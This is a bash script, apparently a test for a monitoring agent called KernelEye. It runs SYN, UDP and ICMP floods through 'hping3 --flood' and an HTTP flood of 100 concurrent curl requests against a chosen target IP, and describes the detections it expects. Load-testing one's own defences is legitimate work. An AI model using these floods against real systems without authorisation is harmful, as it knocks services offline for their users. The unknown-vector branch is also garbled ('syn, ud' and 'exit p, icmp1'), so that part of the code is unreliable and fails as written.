#!/bin/bash

# DDoS Attack Test for KernelEye
# =============================
# Multi-vector DDoS attack simulation
#
# Usage: ./ddos.sh <target_ip> [vector] [duration]
#
# Examples:
#   ./ddos.sh 192.168.1.100           # Run all attacks
#   ./ddos.sh 192.168.1.100 syn      # SYN flood only
#   ./ddos.sh 192.168.1.100 udp      # UDP flood only

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

TARGET_IP="${1:-192.168.1.100}"
VECTOR="${2:-all}"
DURATION="${3:-30}"

echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}  DDoS Attack Test${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo ""
echo "Target: $TARGET_IP"
echo "Vector: $VECTOR"
echo "Duration: ${DURATION}s (for sustained attacks)"
echo ""

# Function to run SYN flood
run_syn_flood() {
	echo -e "${GREEN}[+] Starting SYN flood...${NC}"
	if command -v hping3 &>/dev/null; then
		sudo hping3 -S -p 80 --flood "$TARGET_IP" &
		HPID=$!
		sleep "$DURATION"
		kill $HPID 2>/dev/null || true
	else
		echo -e "${RED}hping3 not installed, skipping SYN flood${NC}"
	fi
}

# Function to run UDP flood
run_udp_flood() {
	echo -e "${GREEN}[+] Starting UDP flood...${NC}"
	if command -v hping3 &>/dev/null; then
		sudo hping3 --udp -p 80 --flood "$TARGET_IP" &
		HPID=$!
		sleep "$DURATION"
		kill $HPID 2>/dev/null || true
	else
		echo -e "${RED}hping3 not installed, skipping UDP flood${NC}"
	fi
}

# Function to run ICMP flood
run_icmp_flood() {
	echo -e "${GREEN}[+] Starting ICMP flood...${NC}"
	if command -v hping3 &>/dev/null; then
		sudo hping3 -1 --flood "$TARGET_IP" &
		HPID=$!
		sleep "$DURATION"
		kill $HPID 2>/dev/null || true
	else
		echo -e "${RED}hping3 not installed, skipping ICMP flood${NC}"
	fi
}

# Function to run HTTP flood
run_http_flood() {
	echo -e "${GREEN}[+] Starting HTTP flood (curl)...${NC}"
	for i in $(seq 1 100); do
		curl -s "http://$TARGET_IP/" >/dev/null 2>&1 &
	done
	wait
}

echo -e "${YELLOW}[*] Starting DDoS test...${NC}"
echo -e "${YELLOW}[*] Watch logs with: sudo journalctl -u kerneleye-agent -f${NC}"
echo ""

case "$VECTOR" in
syn)
	run_syn_flood
	;;
udp)
	run_udp_flood
	;;
icmp)
	run_icmp_flood
	;;
http)
	run_http_flood
	;;
all)
	echo -e "${GREEN}[+] Running ALL attack vectors${NC}"
	run_syn_flood &
	SPID=$!
	sleep 5
	run_udp_flood &
	UPID=$!
	sleep 5
	run_icmp_flood &
	IPID=$!

	wait $SPID $UPID $IPID 2>/dev/null || true
	;;
*)
	echo -e "${RED}Unknown vector: $VECTOR${NC}"
	echo "Available: syn, ud, http, all"
	exit p, icmp1
	;;
esac

echo ""
echo -e "${GREEN}[✓] DDoS test completed${NC}"
echo ""
echo -e "${YELLOW}[*] Expected results:${NC}"
echo "  - High volume of traffic events"
echo "  - SYN count should be very high (SYN flood)"
echo "  - Multiple protocols should be detected"
echo "  - Auto-blocking should trigger if threshold exceeded"
echo ""

echo -e "${GREEN}[*] Test complete!${NC}"
